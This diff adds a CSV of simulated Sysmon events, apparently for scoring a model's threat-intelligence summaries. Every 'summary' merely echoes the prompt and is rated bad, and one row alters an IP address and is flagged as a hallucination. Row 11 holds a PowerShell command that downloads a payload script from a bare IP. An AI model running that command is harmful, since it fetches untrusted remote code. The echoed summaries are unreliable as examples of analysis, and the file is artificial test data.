@@ -1,0 +1,11 @@
+id,sysmon_log,generated_summary,anomaly_score,manual_quality,hallucination_flag
+13,File Create: excel.exe created file budget_2024.xlsx in Documents,Summarize this SYSMON event as a CTI report:File Create: excel.exe created file budget_2024.xlsx in Documents,0.0131569122025263,bad,no
+5,Registry Modification: winword.exe modified registry key HKCU\Software\Microsoft\Office,Summarize this SYSMON event as a CTI report:Registry Modification: winword.exe modified registry key HKCU\Software\Microsoft\Office,0.0113877628454329,bad,no
+14,Process Terminate: lgpo.exe PID 4552 terminated unexpectedly,Summarize this SYSMON event as a CTI report:Process Terminate: lgpo.exe PID 4552 terminated unexpectedly,0.0010843240149422,bad,no
+15,Scheduled Task: schtasks.exe created task 'WindowsTelemetryUpload' scheduled hidden daily at 03:00,Summarize this SYSMON event as a CTI report:Scheduled Task: schtasks.exe created task 'WindowsTelemetryUpload' scheduled hidden daily at 03:00,-0.0002710810037356,bad,no
+9,Driver Load: ntoskrnl.exe loaded driver intelppm.sys,Summarize this SYSMON event as a CTI report:Driver Load: ntoskrnl.exe loaded driver intelppm.sys,-0.0051515944115682,bad,no
+10,Network Connect: chrome.exe connected to accounts.google.com via HTTPS,Summarize this SYSMON event as a CTI report:Network Connect: chrome.exe connected to accounts.google.com via HTTPS,-0.006302146068437,bad,no
+1,Process Create: User Alice launched chrome.exe PID 4200 from C:\Program Files\Google\Chrome\chrome.exe,Summarize this SYSMON event as a CTI report:Process Create: User Alice launched chrome.exe PID 4200 from C:\Program Files\Google\Chrome\chrome.exe,-0.0099121085431144,bad,no
+7,Network Connect: svchost.exe connected to 23.81.120.44:8080,Summarize this SYSMON event as a CTI report:Network Connect: svchost.exe connected to 23.81.120.44:8080,-0.0191107874162458,bad,no
+11,Process Create: powershell.exe executed command Invoke-WebRequest http://185.11.102.9/payload.ps1,Summarize this SYSMON event as a CTI report:Process Create: powershell.exe executed command Invoke-WebRequest http://185.102.11.9/payload.ps1,-0.0194764499543356,bad,yes
+8,File Create: rundll32.exe created file tmp.dll in AppData\Local\Temp,Summarize this SYSMON event as a CTI report:File Create: rundll32.exe created file tmp.dll in AppData\Local\Temp,-0.0211911002101637,bad,no
